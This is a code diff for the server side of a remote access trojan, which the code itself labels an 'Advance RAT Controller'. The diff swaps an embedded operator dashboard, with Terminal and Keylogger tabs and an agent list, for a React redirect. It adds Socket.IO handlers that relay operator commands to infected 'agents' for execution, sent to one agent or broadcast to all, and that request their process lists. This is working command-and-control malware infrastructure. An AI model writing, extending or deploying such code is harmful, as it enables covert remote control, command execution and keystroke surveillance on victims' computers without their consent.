@@ -1170,501 +1170,9 @@ def change_password():
     except Exception as e:
         return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500
 
-# --- Web Dashboard HTML (with Socket.IO) ---
-DASHBOARD_HTML = r'''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Advance RAT Controller — Best Practices Dashboard</title>
-
-<!-- Fonts & libs -->
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
-
-<style>
-  :root{
-    --bg-1:#070709;         /* deep black */
-    --bg-2:#0f1724;         /* dark blue/charcoal */
-    --glass: rgba(255,255,255,0.03);
-    --glass-2: rgba(255,255,255,0.04);
-    --accent-a:#00d4ff;
-    --accent-b:#7c5cff;
-    --muted:#98a0b3;
-    --card-border: rgba(255,255,255,0.04);
-  }
-  *{box-sizing:border-box}
-  html,body{height:100%;margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,roboto,"Helvetica Neue",Arial;}
-  body{
-    background: radial-gradient(1200px 600px at 10% 10%, rgba(30,40,60,0.3), transparent),
-                radial-gradient(1000px 600px at 90% 90%, rgba(90,40,120,0.12), transparent),
-                linear-gradient(180deg,var(--bg-1),var(--bg-2));
-    color:#dbe7ff;
-    -webkit-font-smoothing:antialiased;
-    overflow:hidden;
-  }
-
-  /* Top navbar */
-  .top-nav{
-    height:68px;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:0 22px;
-    gap:16px;
-    border-bottom:1px solid rgba(255,255,255,0.03);
-    backdrop-filter:blur(6px);
-    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
-    position:relative;
-  }
-  .brand{
-    display:flex;
-    align-items:center;
-    gap:14px;
-  }
-  .brand .logo{
-    height:44px;width:44px;border-radius:10px;
-    background:linear-gradient(135deg,var(--accent-a),var(--accent-b));
-    display:flex;align-items:center;justify-content:center;font-weight:800;font-family:Orbitron;
-    color:#02111a; box-shadow:0 6px 20px rgba(0,0,0,0.6);
-  }
-  .brand h1{font-size:1.05rem;margin:0;color:#e8f5ff;font-weight:700}
-  .nav-tabs{display:flex;gap:12px;margin-left:20px}
-  .nav-tab{
-    color:var(--muted); padding:10px 12px; border-radius:8px; font-weight:600; font-size:0.9rem;
-    cursor:pointer; transition:all .15s ease;
-  }
-  .nav-tab.active{
-    color:white; background:linear-gradient(90deg, rgba(0,212,255,0.06), rgba(124,92,255,0.05));
-    border:1px solid rgba(255,255,255,0.03);
-    box-shadow:0 6px 20px rgba(7,22,50,0.5);
-  }
-
-  .top-actions{display:flex;align-items:center;gap:12px}
-  .top-actions .btn{
-    background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.03);padding:8px 12px;border-radius:8px;font-weight:600;
-  }
-  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;border-radius:8px}
-
-  /* Page layout */
-  .page{
-    display:grid;
-    grid-template-columns: 320px 1fr 360px;
-    grid-template-rows: auto 1fr;
-    gap:16px;
-    height: calc(100vh - 68px);
-    padding:18px;
-  }
-
-  /* Filters row spanning center+right */
-  .filters{
-    grid-column: 1 / span 3;
-    display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;background:var(--glass-2);
-    border:1px solid var(--card-border); margin-bottom:0;
-  }
-  .filters .filter{padding:10px 12px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);color:var(--muted);font-weight:600}
-  .filters .filter.select{min-width:180px}
-  .filters .spacer{flex:1}
-
-  /* Left sidebar */
-  .sidebar{
-    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    border-radius:12px;padding:16px;border:1px solid var(--card-border);overflow:auto;
-  }
-  .sidebar h3{margin:0 0 12px 0;font-size:0.95rem;color:#fff}
-  .agent-list{display:flex;flex-direction:column;gap:10px}
-  .agent-item{
-    display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);
-    border:1px solid rgba(255,255,255,0.02); cursor:pointer;
-  }
-  .agent-item .meta{display:flex;gap:10px;align-items:center}
-  .agent-bullet{width:12px;height:12px;border-radius:50%}
-  .bullet-online{background:#0ee6a6;box-shadow:0 0 8px rgba(14,230,166,0.12)}
-  .bullet-off{background:#ff5c7c}
-  .agent-name{font-weight:700;color:#eaf7ff}
-  .agent-sub{font-size:0.8rem;color:var(--muted)}
-
-  .controls{margin-top:14px;display:flex;flex-direction:column;gap:10px}
-  .control-btn{padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted);font-weight:700;cursor:pointer}
-  .control-btn.primary{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));color:#02111a;border:none}
-
-  /* Center area */
-  .center{
-    display:flex;flex-direction:column;gap:14px;padding:6px;overflow:hidden;
-  }
-  .card{
-    border-radius:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    border:1px solid var(--card-border);
-  }
-
-  .summary-row{display:grid;grid-template-columns: repeat(3,1fr);gap:14px}
-  .summary-card{display:flex;gap:14px;align-items:center}
-  .summary-card .chart-wrap{width:100px;height:100px;display:flex;align-items:center;justify-content:center}
-  .summary-card .info{flex:1}
-  .metric-big{font-size:1.45rem;font-weight:800;color:#fff}
-  .metric-sub{color:var(--muted);font-size:0.85rem;margin-top:6px}
-
-  .trend{
-    margin-top:6px;height:320px;
-  }
-
-  /* Right column */
-  .rightcol{display:flex;flex-direction:column;gap:14px;padding:0 6px;overflow:auto}
-  .metric-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-  .metric-pill{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid var(--card-border);text-align:center}
-  .metric-pill .v{font-weight:800;font-size:1.3rem;color:#fff}
-  .terminal{height:260px;padding:12px;border-radius:10px;background:#071226;border:1px solid rgba(255,255,255,0.02);overflow:auto;font-family:monospace;color:#8ef0c5}
-
-  /* System Overview sections */
-  .system-overview{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
-  .overview-section{padding:16px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05)}
-  .overview-section h4{margin:0 0 12px 0;color:#fff;font-size:1rem;font-weight:600}
-  .info-display{display:flex;flex-direction:column;gap:8px}
-  .info-item{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
-  .info-item .label{color:var(--muted);font-size:0.9rem}
-  .info-item span:last-child{color:#fff;font-weight:500;text-align:right}
-
-  /* Small helpers */
-  .muted{color:var(--muted)}
-  .small{font-size:0.85rem}
-  .kpi{display:flex;gap:8px;align-items:center}
-  .kpi .dot{width:10px;height:10px;border-radius:50%}
-  .dot-blue{background:var(--accent-a)}
-  .dot-purple{background:var(--accent-b)}
-
-  /* responsive */
-  @media (max-width:1100px){
-    .page{grid-template-columns: 1fr; grid-auto-rows: auto; height:calc(100vh - 68px); overflow:auto}
-    .filters{grid-column:1}
-  }
-</style>
-</head>
-<body>
-
-  <div class="top-nav">
-    <div class="brand">
-      <div class="logo">N</div>
-      <div style="display:flex;flex-direction:column;line-height:1">
-        <h1>Advance Rat Controller</h1>
-        <div class="muted small">Agent Live Monitoring</div>
-      </div>
-
-      <div class="nav-tabs" style="margin-left:22px">
-        <div class="nav-tab active">Overview</div>
-        <div class="nav-tab">List Process</div>
-        <div class="nav-tab">System Info</div>
-        <div class="nav-tab">Terminal</div>
-        <div class="nav-tab">Keylogger</div>
-        
-      </div>
-    </div>
-
-    <div class="top-actions">
-      <div class="small muted">Agent: <strong style="color:white">45t8ZVUro7QhXlClAAAB</strong></div>
-      <a href="/logout" class="logout">Logout</a>
-    </div>
-  </div>
-
-  <div class="page">
-
-    <!-- FILTERS -->
-    <div class="filters">
-      <div class="filter select">Device Group: <strong style="margin-left:8px;color:white">Online</strong></div>
-      <div class="filter select">Category: <strong style="margin-left:8px;color:white">Security</strong></div>
-      <div class="filter">Checks: <strong style="margin-left:8px;color:white">Failed</strong></div>
-      <div class="filter">Time Range: <strong style="margin-left:8px;color:white">current</strong></div>
-      <div class="spacer"></div>
-      <div class="filter small">Export</div>
-      <div class="filter small">Refresh</div>
-    </div>
-
-    <!-- LEFT -->
-    <div class="sidebar card">
-      <h3>Active Agents</h3>
-      <div class="agent-list" id="agent-list">
-        <!-- JS will populate -->
-        <div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">
-          No agents connected
-        </div>
-      </div>
-
-      <div class="controls">
-        <button class="control-btn primary" onclick="getSystemInfo()">Agent Stats</button>
-        <button class="control-btn" onclick="getNetworkInfo()">System Health</button>
-        <button class="control-btn" onclick="listProcesses()">List Processes</button>
-        <button class="control-btn" onclick="refreshOverview()">Refresh Dashboard</button>
-      </div>
-    </div>
-
-    <!-- CENTER -->
-    <div class="center">
-      <!-- Summary row -->
-      <div class="card summary-row">
-        <div class="summary-card">
-          <div class="chart-wrap">
-            <canvas id="doughnut1" width="100" height="100"></canvas>
-          </div>
-          <div class="info">
-            <div class="metric-big" id="metric1">23</div>
-            <div class="metric-sub">Agent Reports</div>
-          </div>
-        </div>
-
-        <div class="summary-card">
-          <div class="chart-wrap">
-            <canvas id="doughnut2" width="100" height="100"></canvas>
-          </div>
-          <div class="info">
-            <div class="metric-big" id="metric2">8</div>
-            <div class="metric-sub">Agents Status</div>
-           
-          </div>
-        </div>
-
-        <div class="summary-card">
-          <div class="chart-wrap">
-            <canvas id="doughnut3" width="100" height="100"></canvas>
-          </div>
-          <div class="info">
-            <div class="metric-big" id="metric3">41%</div>
-            <div class="metric-sub">Overall Pass Rate</div>
-            <div class="small muted">Trend vs previous period</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Trend chart -->
-      <div class="card">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-          <div style="font-weight:700">Controller Status</div>
-          <div class="muted small">Last 30 days</div>
-        </div>
-        <div class="trend">
-          <canvas id="trendChart" width="800" height="320"></canvas>
-        </div>
-      </div>
-
-      <!-- System Overview with Dashboard Metrics -->
-      <div style="display:flex;gap:12px">
-        <div class="card" style="flex:1">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-            <div style="font-weight:700">System Overview</div>
-            <div class="muted small">Real-time monitoring</div>
-          </div>
-          <div class="system-overview">
-            <div class="overview-section">
-              <h4>Agent Statistics</h4>
-              <div id="agent-stats-display" class="info-display">
-                <div class="info-item"><span class="label">Agent Reports:</span> <span id="agent-reports">39</span></div>
-                <div class="info-item"><span class="label">Agents Status:</span> <span id="agents-status">26</span></div>
-                <div class="info-item"><span class="label">Overall Pass Rate:</span> <span id="pass-rate">57%</span></div>
-                <div class="info-item"><span class="label">Trend:</span> <span id="trend-info">vs previous period</span></div>
-              </div>
-            </div>
-            <div class="overview-section">
-              <h4>System Health</h4>
-              <div id="system-health-display" class="info-display">
-                <div class="info-item"><span class="label">Controller Status:</span> <span id="controller-status">Active</span></div>
-                <div class="info-item"><span class="label">Monitoring Period:</span> <span id="monitoring-period">Last 30 days</span></div>
-                <div class="info-item"><span class="label">System Uptime:</span> <span id="system-uptime">Loading...</span></div>
-                <div class="info-item"><span class="label">Last Update:</span> <span id="last-update">Just now</span></div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="card" style="width:340px">
-          <div style="display:flex;justify-content:space-between;align-items:center">
-            <div style="font-weight:700">Quick Metrics</div>
-            <div class="muted small">Real-time</div>
-          </div>
-
-          <div class="metric-grid" style="margin-top:12px">
-            <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
-            <div class="metric-pill"><div class="v" id="m2">5</div><div class="small muted">Online Systems</div></div>
-            <div class="metric-pill"><div class="v" id="m3">98%</div><div class="small muted">System Health</div></div>
-            <div class="metric-pill"><div class="v" id="m4">45ms</div><div class="small muted">Response Time</div></div>
-          </div>
-
-          <div style="margin-top:12px;font-weight:700">Output</div>
-          <div class="terminal" id="output-terminal">NEURAL_TERMINAL_v2.1 &gt; Waiting for events...</div>
-        </div>
-      </div>
-    </div>
-
-    <!-- RIGHT -->
-    <div class="rightcol">
-      <div class="card">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <div style="font-weight:700">Config Status</div>
-          <div class="muted small">Last updated: <span id="cfg-time">—</span></div>
-        </div>
-        <div style="margin-top:12px;display:grid;gap:8px">
-          <div style="display:flex;justify-content:space-between"><div class="muted">Admin password set</div><div id="cfg1">Yes</div></div>
-          <div style="display:flex;justify-content:space-between"><div class="muted">Secret key</div><div id="cfg2">Hidden</div></div>
-          <div style="display:flex;justify-content:space-between"><div class="muted">Session timeout</div><div id="cfg3">3600s</div></div>
-          <div style="display:flex;justify-content:space-between"><div class="muted">Blocked IPs</div><div id="cfg4">0</div></div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div style="font-weight:700;margin-bottom:8px">Password Management</div>
-        <div style="display:flex;flex-direction:column;gap:8px">
-          <input id="new-pass" placeholder="New password" style="padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:#fff">
-          <button class="control-btn primary" onclick="changePassword()">Change Password</button>
-          <div class="small muted">Make sure you are connected via secure channel.</div>
-        </div>
-      </div>
-    </div>
-
-  </div>
-
-<script>
-  /* --------- Socket.IO hook (existing server) --------- */
-  const socket = io();
-
-  // Example socket events wiring - adapt to your server event names
-  socket.on('connect', ()=> {
-    appendLog('Socket connected: ' + socket.id);
-    updateMetric('m1', '---');
-  });
-
-  socket.on('agent_list', data => {
-    renderAgentList(data);
-  });
-
-  socket.on('terminal_output', data => {
-    appendLog(data);
-  });
-
-  socket.on('config_status', data => {
-    document.getElementById('cfg-time').innerText = new Date().toLocaleTimeString();
-    document.getElementById('cfg1').innerText = data.admin_password_set ? 'Yes':'No';
-    document.getElementById('cfg3').innerText = data.session_timeout + 's';
-    document.getElementById('cfg4').innerText = data.blocked_ips.length;
-  });
-
-  /* --------- Render helpers --------- */
-  function appendLog(msg){
-    const el = document.getElementById('output-terminal');
-    el.innerText = (new Date().toLocaleTimeString()) + ' > ' + msg + '\\n' + el.innerText;
-  }
-  function renderAgentList(list){
-    const container = document.getElementById('agent-list');
-    container.innerHTML = '';
-    if(!list || list.length===0){
-      container.innerHTML = '<div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">No agents connected</div>';
-      return;
-    }
-    list.forEach(a=>{
-      const item = document.createElement('div');
-      item.className='agent-item';
-      item.innerHTML = `<div class="meta"><div style="display:flex;flex-direction:column"><div class="agent-name">${a.name || a.id}</div><div class="agent-sub">${a.os||'unknown'}</div></div></div><div style="display:flex;align-items:center;gap:8px"><div class="agent-bullet ${a.online?'bullet-online':'bullet-off'}"></div><div class="muted small">${a.id}</div></div>`;
-      item.onclick = ()=>{ selectAgent(a.id); };
-      container.appendChild(item);
-    });
-  }
-  function selectAgent(id){ document.getElementById('agent-id')?.setAttribute('value', id); appendLog('Selected agent '+id); }
-
-  /* --------- Chart.js: doughnuts + trend --------- */
-  const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};
-
-  const d1 = new Chart(document.getElementById('doughnut1').getContext('2d'),{
-    type:'doughnut',
-    data:{labels:['error','problems','bugs'], datasets:[{data:[60,30,10], backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
-    options:doughnutOpts
-  });
-  const d2 = new Chart(document.getElementById('doughnut2').getContext('2d'),{
-    type:'doughnut',
-    data:{labels:['Online','Recently','Offline'], datasets:[{data:[40,30,30], backgroundColor:[getColor('--accent-b'),getColor('--accent-a'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
-    options:doughnutOpts
-  });
-  const d3 = new Chart(document.getElementById('doughnut3').getContext('2d'),{
-    type:'doughnut',
-    data:{labels:['Pass','Fail'], datasets:[{data:[59,41], backgroundColor:['rgba(0,255,190,0.12)','rgba(255,92,124,0.12)'], borderWidth:0}]},
-    options:doughnutOpts
-  });
-
-  const trendCtx = document.getElementById('trendChart').getContext('2d');
-  const trendChart = new Chart(trendCtx, {
-    type: 'line',
-    data: {
-      labels: Array.from({length:30}, (_,i)=>'Day '+(i+1)),
-      datasets: [
-        {label:'latency', data: randomSeries(30,40,85), borderColor:getColor('--accent-a'), tension:0.28, pointRadius:2, fill:false},
-        {label:'Overall Agents', data: randomSeries(30,20,70), borderColor:getColor('--accent-b'), tension:0.28, pointRadius:2, fill:false},
-        {label:'Network', data: randomSeries(30,10,60), borderColor:'#9be8ff', tension:0.28, pointRadius:2, fill:false},
-        {label:'Service', data: randomSeries(30,5,55), borderColor:'#7ee3b6', tension:0.28, pointRadius:2, fill:false}
-      ]
-    },
-    options:{
-      responsive:true, maintainAspectRatio:false,
-      plugins:{legend:{labels:{color:'#cfeaff'}}},
-      scales:{
-        x:{grid:{display:false}, ticks:{color:'#9fb8d8'}},
-        y:{grid:{color:'rgba(255,255,255,0.03)'}, ticks:{color:'#9fb8d8'}}
-      }
-    }
-  });
-
-  function randomSeries(n,min,max){ return Array.from({length:n}, ()=> Math.round(Math.random()*(max-min)+min)); }
-  function getColor(varName){
-    // read value from CSS variable
-    return getComputedStyle(document.documentElement).getPropertyValue(varName) || '#00d4ff';
-  }
-
-  /* --------- helpers for updating DOM metrics --------- */
-  function updateMetric(id,val){ const el=document.getElementById(id); if(el) el.innerText=val; }
-  function appendToEl(id,txt){ const e=document.getElementById(id); if(e) e.innerText += '\\n'+txt; }
-
-  /* --------- Overview and dashboard functions --------- */
-  function issueCommand(){ const cmd = document.getElementById('command')?.value || ''; if(cmd) { socket.emit('issue_command', {command:cmd}); appendLog('Issued command: '+cmd);} }
-  function listProcesses(){ socket.emit('list_processes'); appendLog('Requested process list'); }
-  function getSystemInfo(){ socket.emit('get_agent_stats'); appendLog('Requested agent statistics'); }
-  function getNetworkInfo(){ socket.emit('get_system_health'); appendLog('Requested system health'); }
-  function refreshOverview(){ socket.emit('refresh_dashboard'); appendLog('Refreshing dashboard data'); }
-  
-  // Handle agent stats response
-  socket.on('agent_stats_response', function(data) {
-    if(data.reports) document.getElementById('agent-reports').textContent = data.reports;
-    if(data.status) document.getElementById('agents-status').textContent = data.status;
-    if(data.pass_rate) document.getElementById('pass-rate').textContent = data.pass_rate;
-    if(data.trend) document.getElementById('trend-info').textContent = data.trend;
-    appendLog('Agent statistics updated');
-  });
-  
-  // Handle system health response
-  socket.on('system_health_response', function(data) {
-    if(data.controller_status) document.getElementById('controller-status').textContent = data.controller_status;
-    if(data.monitoring_period) document.getElementById('monitoring-period').textContent = data.monitoring_period;
-    if(data.uptime) document.getElementById('system-uptime').textContent = data.uptime;
-    if(data.last_update) document.getElementById('last-update').textContent = data.last_update;
-    appendLog('System health updated');
-  });
-  
-  // Auto-refresh dashboard metrics every 30 seconds
-  setInterval(() => {
-    refreshOverview();
-  }, 30000);
-  function changePassword(){
-    const p = document.getElementById('new-pass').value;
-    if(!p || p.length<8){ alert('Choose password >= 8 chars'); return; }
-    fetch('/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({current_password:'', new_password:p})})
-      .then(r=>r.json()).then(j=>{ if(j.success) alert('Password changed'); else alert('Error: '+j.message) }).catch(e=>alert('Error'));
-  }
-
-  /* demo: update metrics every 7s */
-  setInterval(()=>{ updateMetric('metric1', Math.floor(Math.random()*60)); updateMetric('metric2', Math.floor(Math.random()*40)); updateMetric('metric3', Math.floor(Math.random()*100)+'%'); updateMetric('m1', Math.floor(Math.random()*20)); },7000);
-
-  /* demo: append a start line */
-  appendLog('Dashboard ready — waiting for agents');
-
-</script>
-</body>
-</html>
-'''
+# --- Web Dashboard HTML removed - now using React frontend ---
+# Dashboard now served by React frontend at /
+# All HTML functionality has been moved to React components
 
 
 # In-memory storage for agent data
@@ -1693,7 +1201,8 @@ def index():
 @app.route("/dashboard")
 @require_auth
 def dashboard():
-    return DASHBOARD_HTML
+    # Dashboard is now served by React frontend
+    return redirect("/")
 
 # --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
 # 
@@ -2616,6 +2125,108 @@ def handle_webrtc_implement_frame_dropping(data):
     except Exception as e:
         print(f"Error implementing frame dropping for {agent_id}: {e}")
         emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)
+
+# Additional Socket.IO handlers for dashboard features
+@socketio.on('get_agent_stats')
+def handle_get_agent_stats():
+    """Get agent statistics for dashboard"""
+    try:
+        # Calculate agent statistics
+        total_agents = len(AGENTS_DATA)
+        online_agents = sum(1 for agent in AGENTS_DATA.values() if agent.get('sid'))
+        reports = total_agents * 3  # Mock calculation
+        pass_rate = f"{int((online_agents / max(total_agents, 1)) * 100)}%" if total_agents > 0 else "0%"
+        
+        emit('agent_stats_response', {
+            'reports': reports,
+            'status': online_agents,
+            'pass_rate': pass_rate,
+            'trend': 'vs previous period'
+        }, room=request.sid)
+        
+    except Exception as e:
+        print(f"Error getting agent stats: {e}")
+        emit('agent_stats_response', {'error': str(e)}, room=request.sid)
+
+@socketio.on('get_system_health')
+def handle_get_system_health():
+    """Get system health information for dashboard"""
+    try:
+        uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(0)  # Mock uptime
+        emit('system_health_response', {
+            'controller_status': 'Active',
+            'monitoring_period': 'Last 30 days',
+            'uptime': f"{uptime.days}d {uptime.seconds//3600}h",
+            'last_update': datetime.datetime.now().strftime('%H:%M:%S')
+        }, room=request.sid)
+        
+    except Exception as e:
+        print(f"Error getting system health: {e}")
+        emit('system_health_response', {'error': str(e)}, room=request.sid)
+
+@socketio.on('list_processes')
+def handle_list_processes():
+    """Get process list from agent"""
+    try:
+        # Forward request to agents
+        emit('list_processes_request', {}, room='agents')
+        emit('terminal_output', 'Requested process list from agents', room='operators')
+        
+    except Exception as e:
+        print(f"Error requesting process list: {e}")
+        emit('terminal_output', f'Error: {str(e)}', room='operators')
+
+@socketio.on('refresh_dashboard')
+def handle_refresh_dashboard():
+    """Refresh dashboard data"""
+    try:
+        # Emit config status
+        emit('config_status', {
+            'admin_password_set': bool(Config.ADMIN_PASSWORD),
+            'session_timeout': Config.SESSION_TIMEOUT,
+            'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS]
+        }, room='operators')
+        
+        # Emit agent list
+        agent_list = []
+        for agent_id, data in AGENTS_DATA.items():
+            agent_list.append({
+                'id': agent_id,
+                'name': data.get('hostname', agent_id),
+                'os': data.get('os', 'Unknown'),
+                'online': bool(data.get('sid'))
+            })
+        
+        emit('agent_list', agent_list, room='operators')
+        emit('terminal_output', 'Dashboard refreshed', room='operators')
+        
+    except Exception as e:
+        print(f"Error refreshing dashboard: {e}")
+        emit('terminal_output', f'Error: {str(e)}', room='operators')
+
+@socketio.on('issue_command')
+def handle_issue_command(data):
+    """Issue command to agent"""
+    try:
+        command = data.get('command')
+        agent_id = data.get('agent_id')
+        
+        if not command:
+            emit('terminal_output', 'Error: No command specified', room=request.sid)
+            return
+            
+        if agent_id and agent_id in AGENTS_DATA:
+            # Send to specific agent
+            emit('execute_command', {'command': command}, room=AGENTS_DATA[agent_id]['sid'])
+            emit('terminal_output', f'Command sent to {agent_id}: {command}', room=request.sid)
+        else:
+            # Send to all agents
+            emit('execute_command', {'command': command}, room='agents')
+            emit('terminal_output', f'Command sent to all agents: {command}', room=request.sid)
+            
+    except Exception as e:
+        print(f"Error issuing command: {e}")
+        emit('terminal_output', f'Error: {str(e)}', room=request.sid)
 
 # WebRTC scaffolding code removed - not currently active
 
